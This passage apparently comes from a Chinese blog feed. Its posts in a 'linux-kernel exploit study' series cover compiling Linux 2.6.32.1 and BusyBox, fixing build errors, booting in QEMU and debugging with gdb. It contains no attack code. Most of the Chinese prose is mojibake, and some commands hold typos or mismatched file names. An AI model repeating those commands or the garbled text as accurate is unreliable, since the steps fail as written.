title="ç¼–è¯‘é¡ºåº"></a>ç¼–è¯‘é¡ºåº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make menuconfig</span><br></pre></td></tr></table></figure><p>ç”±äºä¹‹å‰ä¸€ç›´é‡åˆ°å‡ ä¸ªé”™è¯¯ï¼š</p><ul><li>ä¸€ä¸ªæ˜¯ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯</span><br><span class="line">linux/ext2_fs.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure>è§£å†³<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Linux System Utilities ---&gt;</span><br><span class="line">[ ] mkfs_ext2 </span><br><span class="line">[ ] mkfs_vfat</span><br></pre></td></tr></table></figure></li><li>å¦ä¸€ä¸ªæ˜¯ä¹‹åqemuè¿›ç³»ç»Ÿå‘ç”Ÿçš„é”™è¯¯ï¼š<br><a href="http://i2.muimg.com/567571/cfd5d8842ce9f0ec.png" class="gallery-item"><img src="http://i2.muimg.com/567571/cfd5d8842ce9f0ec.png"></a><br>è§£å†³ï¼š<br>Busybox Settings -&gt;Build Options -&gt;Build BusyBox as a static binary (no shared libs)<br><a href="http://i2.muimg.com/567571/dbbba270d0e9d27e.png" class="gallery-item"><img src="http://i2.muimg.com/567571/dbbba270d0e9d27e.png"></a><br>$ make<br>$ make install<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯</span><br><span class="line">loginutils/passwd.c:<span class="number">188</span>:<span class="number">12</span>: error: â€˜RLIMIT_FSIZEâ€™ undeclared (first use in <span class="keyword">this</span> function)</span><br><span class="line">  setrlimit(RLIMIT_FSIZE, &amp;rlimit_fsize);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è§£å†³</span><br><span class="line">$  vim include/libbb.h</span><br><span class="line">$  add a line <span class="comment">#include &lt;sys/resource.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/resource.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="é…ç½®busybox"><a href="#é…ç½®busybox" class="headerlink" title="é…ç½®busybox"></a>é…ç½®busybox</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _install</span><br><span class="line"></span><br><span class="line">åˆ›å»ºå¯¹åº”çš„ç›®å½•</span><br><span class="line">$ mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line">$ cat init</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s <span class="comment"># We need this to find /dev/sda later</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh</span><br><span class="line">$ chmod +x init</span><br><span class="line">$ find . -print0 \</span><br><span class="line">    | cpio --null -ov --format=newc \</span><br><span class="line">    | gzip -9 &gt; /tmp/initramfs-busybox-x86.cpio.gz</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd /tmp/initramfs-busybox-x86.cpio.gz</span><br></pre></td></tr></table></figure><p><a href="http://i1.piimg.com/567571/2c94ce435cc6c77d.png" class="gallery-item"><img src="http://i1.piimg.com/567571/2c94ce435cc6c77d.png"></a></p><h2 id="åœ¨qemuä¸­æµ‹è¯•"><a href="#åœ¨qemuä¸­æµ‹è¯•" class="headerlink" title="åœ¨qemuä¸­æµ‹è¯•"></a>åœ¨qemuä¸­æµ‹è¯•</h2><p>æŠŠç¼–è¯‘å¥½çš„é™æ€æ–‡ä»¶æ·»åŠ åˆ°busyboxä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp swing_test_syscall_lib ~&#x2F;linux-kernel&#x2F;busybox-1.22.1&#x2F;_install&#x2F;usr&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„ï¼Œæ¯æ¬¡æ‹·è´æ–°æ–‡ä»¶åˆ°busyboxçš„æ–‡ä»¶ç³»ç»Ÿä¸­å»ï¼Œéƒ½è¦ç”Ÿæˆæ–°çš„é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find . -print0 \</span><br><span class="line">    | cpio --null -ov --format=newc \</span><br><span class="line">    | gzip -9 &gt; /tmp/initramfs-busybox-x86.cpio.gz</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd /tmp/initramfs-busybox-x86.cpio.gz</span><br></pre></td></tr></table></figure><p>åœ¨qemuä¸­æµ‹è¯•ç³»ç»Ÿè°ƒç”¨<br>$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd /tmp/initramfs-busybox-x86.cpio.gz</p><p>è¿›å…¥åˆ°qemu<br><a href="http://i1.piimg.com/567571/6d01c34124e5aaa6.png" class="gallery-item"><img src="http://i1.piimg.com/567571/6d01c34124e5aaa6.png"></a></p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p><a href="http://bobao.360.cn/learning/detail/3700.html">ã€ç³»åˆ—åˆ†äº«ã€‘Linux å†…æ ¸æ¼æ´åˆ©ç”¨æ•™ç¨‹ï¼ˆä¸€ï¼‰ï¼šç¯å¢ƒé…ç½®</a><br><a href="http://www.cs.rochester.edu/~sandhya/csc256/">Adding a new system call to the Linux kernel</a><br><a href="http://linuxseekernel.blogspot.ie/2014/07/adding-system-call-in-x86-qemu.html">Adding a system call in X86 QEMU Environment</a><br><a href="http://linuxseekernel.blogspot.com/2014/06/create-simple-file-system.html">Create a simple file system</a><br><a href="https://beyermatthias.de/blog/2016/11/01/setup-for-linux-kernel-dev-using-qemu/">Setup for linux kernel dev using qemu</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  studyï¼ˆ1ï¼‰ ---ç¼–è¯‘å¹¶ç”¨qemuè¿è¡Œå†…æ ¸</title>
      <link href="Complie-linux-kernel-and-running-it-using-qemu.html"/>
      <url>Complie-linux-kernel-and-running-it-using-qemu.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Jokerå¸ˆå‚…è€æ—©å‰å‘äº†ä¸¤ä¸ª linux kernelçš„pwn demoç»™æˆ‘ä»¬ï¼Œæˆ‘åˆ°ç°åœ¨æ‰å¼€å§‹æ</p><h1 id="ç¼–è¯‘linux-kernel"><a href="#ç¼–è¯‘linux-kernel" class="headerlink" title="ç¼–è¯‘linux kernel"></a>ç¼–è¯‘linux kernel</h1><h2 id="linuxå†…æ ¸ä¸‹è½½"><a href="#linuxå†…æ ¸ä¸‹è½½" class="headerlink" title="linuxå†…æ ¸ä¸‹è½½"></a><a href="https://www.kernel.org/pub/linux/kernel/v2.6/">linuxå†…æ ¸ä¸‹è½½</a></h2><p>åˆ›å»ºç›®å½•ï¼Œæ”¾æˆ‘ä»¬è¦æ”¾çš„linux kernel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ madir linux-kernel</span><br><span class="line">$ <span class="built_in">cd</span> linux-kernel</span><br><span class="line">$ mkdir linux-2.6.32.1</span><br><span class="line">$ <span class="built_in">cd</span> linux-2.6.32.1/</span><br><span class="line">$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.1.tar.gz -O linux-2.6.32.1.tar.gz </span><br></pre></td></tr></table></figure><h2 id="è§£å‹"><a href="#è§£å‹" class="headerlink" title="è§£å‹"></a>è§£å‹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xjvf linux-2.6.32.1.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> linux-2.6.32.1/</span><br></pre></td></tr></table></figure><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¿™ä¸ªåœ°æ–¹ï¼Œå¯èƒ½ä¼šå‡ºç°å‡ ä¸ªé”™è¯¯~</p><h3 id="æŠ¥é”™-ä»¥åŠè§£å†³åŠæ³•"><a href="#æŠ¥é”™-ä»¥åŠè§£å†³åŠæ³•" class="headerlink" title="æŠ¥é”™ ä»¥åŠè§£å†³åŠæ³•"></a>æŠ¥é”™ ä»¥åŠè§£å†³åŠæ³•</h3><h4 id="ç¼–è¯‘å‡ºç°çš„é—®é¢˜"><a href="#ç¼–è¯‘å‡ºç°çš„é—®é¢˜" class="headerlink" title="ç¼–è¯‘å‡ºç°çš„é—®é¢˜"></a>ç¼–è¯‘å‡ºç°çš„é—®é¢˜</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯ï¼š</span><br><span class="line">rch/x86/kernel/ptrace.c:<span class="number">1472</span>:<span class="number">17</span>: error: conflicting types <span class="keyword">for</span> â€˜syscall_trace_enterâ€™</span><br><span class="line"> <span class="function">asmregparm <span class="keyword">long</span> <span class="title">syscall_trace_enter</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/vm86.h:<span class="number">130</span>:<span class="number">0</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/processor.h:<span class="number">10</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/thread_info.h:<span class="number">22</span>,</span><br><span class="line">                 from include/linux/thread_info.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/preempt.h:<span class="number">9</span>,</span><br><span class="line">                 from include/linux/spinlock.h:<span class="number">50</span>,</span><br><span class="line">                 from include/linux/seqlock.h:<span class="number">29</span>,</span><br><span class="line">                 from include/linux/time.h:<span class="number">8</span>,</span><br><span class="line">                 from include/linux/timex.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/sched.h:<span class="number">56</span>,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:<span class="number">11</span>:</span><br><span class="line">/home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/ptrace.h:<span class="number">145</span>:<span class="number">13</span>: note: previous declaration of â€˜syscall_trace_enterâ€™ was here</span><br><span class="line"> <span class="function"><span class="keyword">extern</span> <span class="keyword">long</span> <span class="title">syscall_trace_enter</span><span class="params">(struct pt_regs *)</span></span>;</span><br><span class="line">             ^</span><br><span class="line">arch/x86/kernel/ptrace.c:<span class="number">1517</span>:<span class="number">17</span>: error: conflicting types <span class="keyword">for</span> â€˜syscall_trace_leaveâ€™</span><br><span class="line"> <span class="function">asmregparm <span class="keyword">void</span> <span class="title">syscall_trace_leave</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/vm86.h:<span class="number">130</span>:<span class="number">0</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/processor.h:<span class="number">10</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/thread_info.h:<span class="number">22</span>,</span><br><span class="line">                 from include/linux/thread_info.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/preempt.h:<span class="number">9</span>,</span><br><span class="line">                 from include/linux/spinlock.h:<span class="number">50</span>,</span><br><span class="line">                 from include/linux/seqlock.h:<span class="number">29</span>,</span><br><span class="line">                 from include/linux/time.h:<span class="number">8</span>,</span><br><span class="line">                 from include/linux/timex.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/sched.h:<span class="number">56</span>,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:<span class="number">11</span>:</span><br><span class="line">/home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/ptrace.h:<span class="number">146</span>:<span class="number">13</span>: note: previous declaration of â€˜syscall_trace_leaveâ€™ was here</span><br><span class="line"> <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">syscall_trace_leave</span><span class="params">(struct pt_regs *)</span></span>;</span><br><span class="line">             ^</span><br><span class="line">make[<span class="number">2</span>]: *** [arch/x86/kernel/ptrace.o] é”™è¯¯ <span class="number">1</span></span><br><span class="line">make[<span class="number">1</span>]: *** [arch/x86/kernel] é”™è¯¯ <span class="number">2</span></span><br><span class="line">make: *** [arch/x86] é”™è¯¯ <span class="number">2</span></span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š<br><strong>ä¸¤å¤„ä¿®æ”¹ï¼š</strong><br><code>/linux-kernel/linux-2.6.32.1/arch/x86/include/asm$ vim ptrace.h</code><br><a href="http://i2.muimg.com/567571/6500043e055b4e05.png" class="gallery-item"><img src="http://i2.muimg.com/567571/6500043e055b4e05.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;linux&#x2F;init.h&gt;</span><br><span class="line">+#include &lt;linux&#x2F;linkage.h&gt;</span><br><span class="line"> </span><br><span class="line"> struct cpuinfo_x86;</span><br><span class="line"> struct task_struct;</span><br><span class="line">@@ -142,8 +143,8 @@ </span><br><span class="line">  int error_code, int si_code);</span><br><span class="line"> void signal_fault(struct pt_regs *regs, void __user *frame, char *where);</span><br><span class="line"> </span><br><span class="line">-extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">-extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">+extern asmregparm long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">+extern asmregparm void syscall_trace_leave(struct pt_regs *);</span><br></pre></td></tr></table></figure><h4 id="gcc-error-elf-i386-æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•"><a href="#gcc-error-elf-i386-æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•" class="headerlink" title="gcc: error: elf_i386: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•"></a>gcc: error: elf_i386: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯:</span><br><span class="line">gcc: error: elf_i386: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">gcc: error: unrecognized command line option â€˜-mâ€™ </span><br></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong><br><code>beswing@swing:~/linux-kernel/linux-2.6.32.1$ vim arch/x86/vdso/Makefile</code><br><a href="http://i1.piimg.com/567571/67130a87d6f0cc69.png" class="gallery-item"><img src="http://i1.piimg.com/567571/67130a87d6f0cc69.png"></a><br>ä¸¤å¤„ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#VDSO_LDFLAGS_vdso.lds = -m elf_x86_64 -Wl,-soname=linux-vdso.so<span class="number">.1</span> \</span><br><span class="line">                        -Wl,-z,max-page-size=<span class="number">4096</span> -Wl,-z,common-page-size=<span class="number">4096</span></span><br><span class="line">VDSO_LDFLAGS_vdso.lds = -m64 -Wl,-soname=linux-vdso.so<span class="number">.1</span> \</span><br><span class="line">                        -Wl,-z,max-page-size=<span class="number">4096</span> -Wl,-z,common-page-size=<span class="number">4096</span></span><br></pre></td></tr></table></figure><p>ä»¥åŠ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># VDSO_LDFLAGS_vdso32.lds = -m elf_i386 -Wl,-soname=linux-gate.so<span class="number">.1</span></span><br><span class="line">VDSO_LDFLAGS_vdso32.lds = -m32 -Wl,-soname=linux-gate.so<span class="number">.1</span></span><br></pre></td></tr></table></figure><h4 id="drivers-net-igbvf-igbvf-h-128-15-error-duplicate-member-â€˜pageâ€™"><a href="#drivers-net-igbvf-igbvf-h-128-15-error-duplicate-member-â€˜pageâ€™" class="headerlink" title="drivers/net/igbvf/igbvf.h:128:15: error: duplicate member â€˜pageâ€™"></a>drivers/net/igbvf/igbvf.h:128:15: error: duplicate member â€˜pageâ€™</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯:</span><br><span class="line">drivers&#x2F;net&#x2F;igbvf&#x2F;igbvf.h:128:15: error: duplicate member â€˜pageâ€™</span><br><span class="line">  struct page *page;</span><br><span class="line">               ^</span><br><span class="line">make[3]: *** [drivers&#x2F;net&#x2F;igbvf&#x2F;ethtool.o] é”™è¯¯ 1</span><br><span class="line">make[2]: *** [drivers&#x2F;net&#x2F;igbvf] é”™è¯¯ 2</span><br><span class="line">make[1]: *** [drivers&#x2F;net] é”™è¯¯ 2</span><br><span class="line">make: *** [drivers] é”™è¯¯ 2 </span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åå­—é‡å¤å³å¯ï¼Œè·¯å¾„åœ¨<code>beswing@swing:~/linux-kernel/linux-2.6.32.1$ vim ./drivers/net/igbvf/igbvf.h</code><br><a href="http://i1.piimg.com/567571/d34539954f6c015b.png" class="gallery-item"><img src="http://i1.piimg.com/567571/d34539954f6c015b.png"></a></p><h2 id="åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ"><a href="#åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ"></a>åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/linux-kernel/linux-2.6.32.1/linux-2.6.32.1/arch/i386/boot</span><br><span class="line">$ mkinitramfs -o initrd.img-2.6.23.1</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨qemuè¿è¡Œç¼–è¯‘å¥½çš„å†…æ ¸"><a href="#ä½¿ç”¨qemuè¿è¡Œç¼–è¯‘å¥½çš„å†…æ ¸" class="headerlink" title="ä½¿ç”¨qemuè¿è¡Œç¼–è¯‘å¥½çš„å†…æ ¸"></a>ä½¿ç”¨qemuè¿è¡Œç¼–è¯‘å¥½çš„å†…æ ¸</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd arch/i386/boot/initrd.img-2.6.32.1  -m 512M</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨qemuè¿è¡Œå†…æ ¸-ä½¿ç”¨qemuå®˜ç½‘æä¾›çš„æ–‡ä»¶ç³»ç»Ÿ"><a href="#ä½¿ç”¨qemuè¿è¡Œå†…æ ¸-ä½¿ç”¨qemuå®˜ç½‘æä¾›çš„æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨qemuè¿è¡Œå†…æ ¸(ä½¿ç”¨qemuå®˜ç½‘æä¾›çš„æ–‡ä»¶ç³»ç»Ÿ)"></a>ä½¿ç”¨qemuè¿è¡Œå†…æ ¸(ä½¿ç”¨qemuå®˜ç½‘æä¾›çš„æ–‡ä»¶ç³»ç»Ÿ)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://wiki.qemu.org/download/linux-0.2.img.bz2 -O linux-0.2.img.bz2</span><br><span class="line">$ bunzip2 -d linux-0.2.img.bz2</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda linux-0.2.img -append <span class="string">&quot;root=/dev/sda&quot;</span></span><br></pre></td></tr></table></figure><h2 id="gdbè°ƒè¯•å†…æ ¸"><a href="#gdbè°ƒè¯•å†…æ ¸" class="headerlink" title="gdbè°ƒè¯•å†…æ ¸"></a>gdbè°ƒè¯•å†…æ ¸</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -S -kernel arch/i386/boot/bzImage -hda linux-0.2.img -append <span class="string">&quot;root=/dev/sda&quot;</span></span><br><span class="line">$ Ctrl+Alt+2å³åˆ‡æ¢åˆ°QEMUå·¥ä½œå°ä¸‹</span><br><span class="line">$ Ctrl+Alt+Gåˆ‡æ¢å‡ºQEMUå·¥ä½œå°</span><br><span class="line">qemu $ gdbserver tcp::1234</span><br><span class="line">$ gdb vmlinux</span><br><span class="line">gdb $ target remote localhost:1234</span><br><span class="line">$ c</span><br></pre></td></tr></table></figure><p>â€‹    </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹è¯»ä¹¦ç¬”è®°---ELFæ–‡ä»¶ç»“æ„</title>
      <link href="a-programmer-prepares-about-elf.html"/>
      <url>a-programmer-prepares-about-elf.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="æ–‡ä»¶å¤´"><a href="#æ–‡ä»¶å¤´" class="headerlink" title="æ–‡ä»¶å¤´"></a>æ–‡ä»¶å¤´</h4><p><code>readelf -h </code> æŸ¥çœ‹ELFæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/æ¡Œé¢/0ctf/Print$ readelf -h ./EasiestPrintf</span><br><span class="line">ELF å¤´ï¼š</span><br><span class="line">  Magicï¼š   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  ç±»åˆ«:                              ELF32</span><br><span class="line">  æ•°æ®:                              2 è¡¥ç ï¼Œå°ç«¯åº (little endian)</span><br><span class="line">  ç‰ˆæœ¬:                              1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI ç‰ˆæœ¬:                          0</span><br><span class="line">  ç±»å‹:                              EXEC (å¯æ‰§è¡Œæ–‡ä»¶)</span><br><span class="line">  ç³»ç»Ÿæ¶æ„:                          Intel 80386</span><br><span class="line">  ç‰ˆæœ¬:                              0x1</span><br><span class="line">  å…¥å£ç‚¹åœ°å€ï¼š               0x8048610</span><br><span class="line">  ç¨‹åºå¤´èµ·ç‚¹ï¼š          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6588 (bytes into file)</span><br><span class="line">  æ ‡å¿—ï¼š             0x0</span><br><span class="line">  æœ¬å¤´çš„å¤§å°ï¼š       52 (å­—èŠ‚)</span><br><span class="line">  ç¨‹åºå¤´å¤§å°ï¼š       32 (å­—èŠ‚)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  èŠ‚å¤´å¤§å°ï¼š         40 (å­—èŠ‚)</span><br><span class="line">  èŠ‚å¤´æ•°é‡ï¼š         29</span><br><span class="line">  å­—ç¬¦ä¸²è¡¨ç´¢å¼•èŠ‚å¤´ï¼š 26</span><br></pre></td></tr></table></figure><p>å¯èƒ½æ˜¯ç”±äºæ˜¯ä¸­æ–‡ç‰ˆçš„ï¼Œç›´æ¥ç»™æˆ‘ç¿»è¯‘äº†ã€‚<br>ELF 